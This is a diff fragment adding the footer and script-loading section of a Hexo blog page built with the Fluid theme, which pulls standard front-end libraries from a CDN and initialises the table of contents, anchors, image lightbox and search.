+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
